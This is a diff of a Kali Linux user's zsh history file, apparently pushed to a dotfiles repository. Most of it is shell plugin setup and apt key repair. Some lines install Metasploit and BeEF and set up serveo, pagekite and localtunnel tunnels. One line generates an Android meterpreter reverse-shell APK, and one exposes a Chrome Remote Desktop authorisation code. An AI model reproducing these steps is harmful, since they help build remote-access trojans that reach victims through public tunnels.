@@ -649,3 +649,356 @@ echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/
 : 1733455663:0;git remote add config git@github.com:boybh/.config
 : 1733455671:0;git add .
 : 1733455675:0;git commit -a
+: 1733455694:0;git push config config --force
+: 1733455747:0;l
+: 1733455769:0;cp /root/.gitignore ~/.config/
+: 1733455771:0;l
+: 1733455807:0;git push config config --force
+: 1733455902:0;git add .gitignore
+: 1733455911:0;gmm "update"
+: 1733455915:0;git push config config --force
+: 1733456150:0;cd
+: 1733456167:0;nn $ADDON/plugins-clone.sh
+: 1733456192:0;pll
+: 1733456240:0;cat /root/.config/addon/zinit_theme.zsh
+: 1733456260:0;cat /root/.config/addon/zinit.zsh
+: 1733456353:0;nn $ADDON/plugins-clone.sh
+: 1733456377:0;plc hlissner/zsh-autopair
+: 1733456385:0;cus
+: 1733456389:0;cd plugins/
+: 1733456416:0;f5
+: 1733456427:0;source ~/.config/.zshrc
+: 1733456432:0;cd
+: 1733456437:0;plc hlissner/zsh-autopair
+: 1733456443:0;cus
+: 1733456445:0;cd plugins/
+: 1733456453:0;del zsh-autopair
+: 1733456455:0;plc hlissner/zsh-autopair
+: 1733456465:0;pla zsh-autopair
+: 1733456467:0;f5
+: 1733456499:0;.c
+: 1733456553:0;git add /root/.config/custom/plugins/zsh-autopair
+: 1733456560:0;git rm --cached custom/plugins/zsh-autopair
+: 1733456563:0;git rm --cached custom/plugins/zsh-autopair -f
+: 1733456584:0;git submodule add https://github.com/hlissner/zsh-autopair custom/plugins/zsh-autopair
+: 1733456597:0;gmm "plugins"
+: 1733456603:0;git push config config --force
+: 1733456654:0;cd
+: 1733456723:0;wls.exe --shutdown
+: 1733457771:0;als
+: 1733457779:0;l
+: 1733457780:0;ls
+: 1733457787:0;cd
+: 1733457788:0;ls
+: 1733457790:0;ls -a
+: 1733457801:0;rm -rf .zshrc.original
+: 1733457828:0;rm -rf .profile
+: 1733457869:0;. ~/.config/.zshrc
+: 1733457881:0;kali-tweaks
+: 1733457903:0;l
+: 1733457918:0;systemctl status sshd
+: 1733457929:0;systemctl show-environment
+: 1733457957:0;systemctl is-enabled
+: 1733459805:0;caidat Metasploit
+: 1733459833:0;caidat metasploit-framework
+: 1733460093:0;msfd init
+: 1733460127:0;msf6
+: 1733460134:0;msfconsole
+: 1733460627:0;source ~/.config/.zshrc
+: 1733460636:0;cd
+: 1733460638:0;sudo apt-get install pagekite
+: 1733460662:0;pagekite --frontend=http --port=8080
+: 1733460680:0;pagekite.py --signup
+: 1733460719:0;pagekite.py boybh.pagekite.me
+: 1733460739:0;sudo apt-get install serveo
+: 1733460762:0;sudo apt-get install teamviewer
+: 1733460871:0;ssh -R 80:localhost:80 serveo.net
+: 1733460935:0;wget https://raw.githubusercontent.com/milio48/serveo/master/serveo.sh
+: 1733460955:0;serveo http 80 0
+: 1733460968:0;serveo.zsh
+: 1733460970:0;l
+: 1733460976:0;chx serveo.sh
+: 1733460979:0;./serveo.sh
+: 1733460988:0;./serveo.sh http  80 0
+: 1733461010:0;./serveo.sh tcp 4869 22
+: 1733461021:0;./serveo.sh tcp 4869 2222
+: 1733461039:0;./serveo.sh tcp 4869 8080
+: 1733461048:0;./serveo.sh tcp 4869 8082
+: 1733461061:0;./serveo.sh tcp 4869 0
+: 1733461094:0;./serveo.sh http  80 0
+: 1733461155:0;npm install -g localtunnel
+: 1733461164:0;caidat npm
+: 1733461486:0;npm install -g localtunnel
+: 1733461518:0;sudo gem install beef
+: 1733461533:0;lt --port 8080
+: 1733461546:0;ald lt
+: 1733461548:0;lt --port 8080
+: 1733461633:0;curl https://loca.lt/mytunnelpassword
+: 1733461773:0;cd apps/
+: 1733461774:0;git clone https://github.com/beefproject/beef.git
+: 1733461782:0;cd beef
+: 1733461797:0;als cd beef
+: 1733461802:0;als beef
+: 1733461814:0;ald beef
+: 1733461817:0;cd beef
+: 1733461822:0;bundle install
+: 1733461924:0;gem update --system
+: 1733461953:0;curl -sSL https://get.rvm.io | bash -s stable
+: 1733461960:0;curl -sSL https://get.rvm.io | zsh -s stable
+: 1733461964:0;curl -sSL https://get.rvm.io | bash -s stable
+: 1733461976:0;rvm install ruby
+: 1733461997:0;curl -sSL https://rvm.io/mpapis.asc | gpg --import -
+: 1733462003:0;curl -sSL https://rvm.io/pkuczynski.asc | gpg --import -
+: 1733462030:0;rvm install ruby
+: 1733462037:0;exec zsh
+: 1733462041:0;rvm install ruby
+: 1733462057:0;sudo apt install build-essential zlib1g-dev libyaml-dev libssl-dev
+: 1733462071:0;wget https://www.ruby-lang.org/en/downloads/releases/
+: 1733462101:0;wget https://cache.ruby-lang.org/pub/ruby/3.3/ruby-3.3.6.tar.gz
+: 1733462147:0;tar -xvf ruby-3.3.6.tar.gz
+: 1733462164:0;cd ruby-3.3.6
+: 1733462170:0;./configure --prefix=/usr/local/ruby-3.3.6
+: 1733462256:0;make
+: 1733462317:0;cd apps/
+: 1733462319:0;wget https://github.com/rubygems/rubygems/archive/refs/tags/v3.4.1.tar.gz
+: 1733462325:0;tar -xvf v3.4.1.tar.gz
+: 1733462330:0;cd rubygems-3.4.1
+: 1733462337:0;sudo ruby setup.rb --prefix=/usr/local/ruby-3.3.6
+: 1733462362:0;export PATH=$PATH:/usr/local/ruby-3.3.6/bin
+: 1733462367:0;ruby -v
+: 1733462375:0;gem -v
+: 1733462402:0;gem update --system
+: 1733462416:0;gem install sqlite3 -v 1.4.2
+: 1733462423:0;gem install xmlrpc -v 0.3.2
+: 1733462435:0;gem install beef --version 0.4.3.1
+: 1733462449:0;cd beef/
+: 1733462451:0;gem install beef --version 0.4.3.1
+: 1733462457:0;gem install beef
+: 1733462537:0;bundle install
+: 1733462555:0;sudo gem install sqlite3
+: 1733462571:0;sudo gem install xmlrpc
+: 1733462576:0;bundle install
+: 1733462645:0;cd beef/
+: 1733462647:0;l
+: 1733462650:0;cd ruby-3.3.6/
+: 1733462652:0;sudo make install
+: 1733463101:0;xoa ~/apps/beef/ruby-3.3.6
+: 1733463109:0;ruby -v
+: 1733463118:0;ruby beef
+: 1733463120:0;cd
+: 1733463124:0;ruby beef
+: 1733463152:0;msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=443 R > mrlonely909.apk
+: 1733463184:0;msfconsole
+: 1733463196:0;ruby beef
+: 1733463202:0;sudo bundle install
+: 1733463293:0;gem install sqlite3
+: 1733463299:0;sudo bundle install
+: 1733463318:0;gem install sqlite3 -v 2.2.0
+: 1733463330:0;sudo bundle install
+: 1733463340:0;ruby beef
+: 1733463351:0;beef
+: 1733463356:0;l
+: 1733463367:0;./beef
+: 1733463416:0;gem install sqlite3 --platform=ruby
+: 1733463500:0;bundle update sqlite3
+: 1733463510:0;./beef
+: 1733463966:0;source ~/.config/.zshrc
+: 1733463970:0;cd
+: 1733463977:0;wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
+: 1733463990:0;dpkg -i chrome-remote-desktop_current_amd64.deb
+: 1733464002:0;dpkg --install chrome-remote-desktop_current_amd64.deb
+: 1733464014:0;chrome-remote-desktop
+: 1733464018:0;update
+: 1733464025:0;upgrade
+: 1733464032:0;apt --fix-broken install
+: 1733464038:0;apt autoremove
+: 1733464046:0;chrome-remote-desktop
+: 1733464056:0;DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AeanS0buZKmBTH-ABJ13dVa8Ia8-e1mmhiwdjbhSIBbPZ-owSlehVZlZTGyWoB3aTVZsDA" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)
+: 1733471949:0;caidat chrome-remote-desktop
+: 1733471960:0;apt autoremove
+: 1733471966:0;apt autoclean
+: 1733471977:0;autopair-init
+: 1733472021:0;sudo apt-get install -y aptitude
+: 1733472049:0;aptitude
+: 1733472224:0;update
+: 1733472266:0;sudo apt update && sudo apt full-upgrade
+: 1733472289:0;update
+: 1733472317:0;sudo apt-key --keyring /etc/apt/trusted.gpg del 44C059B58B8F8B3D
+: 1733472321:0;sudo gpg --keyserver hkp://pool.sks-keyservers.net --recv-keys 44C059B58B8F8B3D
+: 1733472333:0;sudo apt update
+: 1733472340:0;sudo apt-key --keyring /etc/apt/trusted.gpg del 44C059B58B8F8B3D
+: 1733472343:0;sudo apt update
+: 1733472357:0;sudo nano /etc/apt/sources.list
+: 1733472393:0;update
+: 1733472416:0;sudo apt-key del 44C059B58B8F8B3D
+: 1733472420:0;sudo wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add
+: 1733472425:0;sudo apt update
+: 1733472433:0;sudo apt-key del 44C059B58B8F8B3D
+: 1733472435:0;sudo apt update
+: 1733472446:0;/etc/apt/trusted.gpg
+: 1733472455:0;ld /etc/apt/trusted.gpg
+: 1733472461:0;sudo chmod +x -R /etc/apt/trusted.gpg
+: 1733472464:0;ld /etc/apt/trusted.gpg
+: 1733472467:0;sudo apt update
+: 1733472497:0;sudo wget -q -O /etc/apt/trusted.gpg https://archive.kali.org/archive-key.gpg
+: 1733472505:0;sudo apt update
+: 1733472518:0;sudo wget -q -O /etc/apt/trusted.gpg https://archive.kali.org/archive-key.gpg
+: 1733472671:0;sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
+: 1733472676:0;sudo apt update
+: 1733472688:0;sudo wget -q -O /etc/apt/trusted.gpg https://archive.kali.org/archive-key.gpg
+: 1733472695:0;sudo rm /etc/apt/sources.list.d/kali.list
+: 1733472707:0;sudo echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" > /etc/apt/sources.list.d/kali.list
+: 1733472712:0;sudo apt update
+: 1733472740:0;sudo apt full-upgrade
+: 1733472765:0;sudo nano /etc/apt/sources.list
+: 1733472771:0;sudo apt update
+: 1733472785:0;aac
+: 1733472789:0;aar
+: 1733472795:0;update
+: 1733472824:0;sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
+: 1733472831:0;sudo apt-key update
+: 1733472838:0;sudo rm /etc/apt/sources.list.d/kali.list
+: 1733472846:0;sudo apt update
+: 1733472871:0;sudo nano /etc/apt/sources.list
+: 1733472884:0;sudo apt update
+: 1733472896:0;sudo nano /etc/apt/sources.list
+: 1733472910:0;sudo apt update
+: 1733472960:0;sudo nano /etc/apt/sources.list
+: 1733472970:0;sudo apt update
+: 1733472988:0;sudo nano /etc/apt/sources.list
+: 1733473000:0;sudo apt update
+: 1733473717:0;sudo apt-key del 44C059B58B8F8B3D
+: 1733473721:0;sudo wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add
+: 1733473726:0;sudo apt update
+: 1733473737:0;sudo wget -q -O /etc/apt/trusted.gpg https://archive.kali.org/archive-key.gpg
+: 1733473741:0;sudo apt update
+: 1733473754:0;sudo apt-key del ED444FF07D8D0BF6
+: 1733473756:0;sudo apt update
+: 1733473785:0;sudo apt-key adv --keyserver keyserver.kali.org --recv-keys ED444FF07D8D0BF6
+: 1733473806:0;sudo apt-key adv --keyserver (link unavailable) --recv-keys ED444FF07D8D0BF6
+: 1733473826:0;sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
+: 1733473832:0;sudo apt update
+: 1733473912:0;sudo apt -y install kali-root-login
+: 1733473953:0;sudo apt install -y kali-desktop-kde
+: 1733473994:0;apt search faraday
+: 1733474041:0;git clone https://github.com/MysticRyuujin/guac-install.git /apps/guac-install
+: 1733474121:0;l
+: 1733474126:0;cd apps
+: 1733474127:0;l
+: 1733474136:0;cd gitmoji/
+: 1733474137:0;l
+: 1733474175:0;sudo apt-get install -y pypy3-venv
+: 1733474211:0;cd
+: 1733474220:0;n
+: 1733474225:0;c
+: 1733474228:0;.
+: 1733474229:0;..
+: 1733474232:0;...
+: 1733474240:0;l
+: 1733474247:0;cd plugins/
+: 1733474248:0;l
+: 1733474255:0;cd autoupdate/
+: 1733474256:0;l
+: 1733474823:0;mv autoupdate $ZPLUGINDIR
+: 1733474825:0;l
+: 1733474833:0;sudo mv autoupdate $ZPLUGINDIR
+: 1733474844:0;sudo mv -f autoupdate $ZPLUGINDIR
+: 1733474846:0;l
+: 1733474849:0;cd autoupdate/
+: 1733474850:0;l
+: 1733474874:0;ls -l /root/.config/custom/plugins/autoupdate
+: 1733474889:0;bat --color=always README.md
+: 1733474906:0;bat --color=always | dich README.md
+: 1733474931:0;sudo apt-get install -y translate-shell translate-toolkit translate-toolkit-doc
+: 1733475104:0;plugin-clone DuckzCantFly/zsh-dot-plugin
+: 1733475114:0;sudo rm -rf plugins
+: 1733475115:0;l
+: 1733475123:0;mnt
+: 1733475125:0;l
+: 1733475137:0;cd apps
+: 1733475139:0;l
+: 1733475164:0;\mv -ifr guac-install ~/apps
+: 1733475169:0;\mv -if guac-install ~/apps
+: 1733475171:0;l
+: 1733475178:0;sudo rm -rf apps
+: 1733475179:0;l
+: 1733475190:0;du -sh tmp
+: 1733475203:0;cd root
+: 1733475207:0;cd /root
+: 1733475210:0;l
+: 1733475218:0;sudo rm -rf chrome-remote-desktop_current_amd64.deb
+: 1733475221:0;ll
+: 1733475245:0;sudo rm -rf /root/mrlonely909.apk
+: 1733475247:0;l
+: 1733475248:0;ll
+: 1733475271:0;als
+: 1733475274:0;alias
+: 1733475302:0;alias_delete xoa
+: 1733475320:0;ala d "sudo rm -rf"
+: 1733475350:0;alias_add cut "sudo mv -if"
+: 1733475373:0;cd
+: 1733475380:0;pll
+: 1733475412:0;$ZPLUGINDIR
+: 1733475446:0;plugin_add zsh-bat zsh_extended zsh-history-substring-search zsh-system-clipboard 
+: 1733475454:0;plugin_add fast-syntax-highlighting
+: 1733475457:0;f5
+: 1733475569:0;nn $ADDON/plugins-clone.sh
+: 1733475600:0;q
+: 1733475603:0;fg
+: 1733475612:0;ald fg
+: 1733475614:0;q
+: 1733475729:0;caiplugin
+: 1733475750:0;als $ADDON/plugins-clone.sh
+: 1733475754:0;cloneplugin
+: 1733475781:0;als $ADDON/plugins-clone.sh
+: 1733475786:0;nn $ADDON/plugins-clone.sh
+: 1733475832:0;q
+: 1733475855:0;cloneplugin
+: 1733475880:0;. ~/.config/addon/plugin-all.zsh
+: 1733475882:0;cloneplugin
+: 1733475893:0;nn ~/.config/addon/plugin-all.zsh
+: 1733475921:0;nn ~/.config/addon/plugins-clone.sh
+: 1733475961:0;. ~/.config/addon/plugins-clone.sh
+: 1733475974:0;pla zsh-expand
+: 1733475989:0;pll
+: 1733475995:0;pld zsh_extended
+: 1733475998:0;exec zsh
+: 1733476021:0;d zsh-system-clipboard'
+: 1733476022:0;d zsh-system-clipboard
+: 1733476032:0;d fast-syntax-highlighting
+: 1733476036:0;d zsh-history-substring-search
+: 1733476039:0;. ~/.config/addon/plugins-clone.sh
+: 1733476046:0;exec zsh
+: 1733476054:0;cd
+: 1733476062:0;set
+: 1733476067:0;autoload
+: 1733476077:0;snap
+: 1733476081:0;znap
+: 1733476103:0;znap pull 
+: 1733476128:0;cd
+: 1733476143:0;$ZPLUGINDIR
+: 1733476153:0;pla alias-tips 
+: 1733476157:0;exec zsh
+: 1733476162:0;cd
+: 1733476172:0;omz update
+: 1733476176:0;cd
+: 1733476185:0;opl alias-tips
+: 1733476187:0;cd
+: 1733476192:0;alias
+: 1733476194:0;cd
+: 1733476198:0;exec zsh
+: 1733476202:0;cd
+: 1733476206:0;f5
+: 1733476222:0;cd
+: 1733476319:0;nn ~/.config/addon/plugins-clone.sh
+: 1733476348:0;. ~/.config/addon/plugins-clone.sh
+: 1733476366:0;cd $ZPLUGINDIR/zsh-autoenv
+: 1733476367:0;l
+: 1733476386:0;cat zsh-autoenv.plugin.zsh zsh-autoenv.plugin.zsh
+: 1733476404:0;pla zsh-autoenv
+: 1733476408:0;f5
+: 1733476413:0;cd
+: 1733476417:0;cd apps
+: 1733476425:0;l
+: 1733476433:0;cd ~/.config/
+: 1733476439:0;git add .
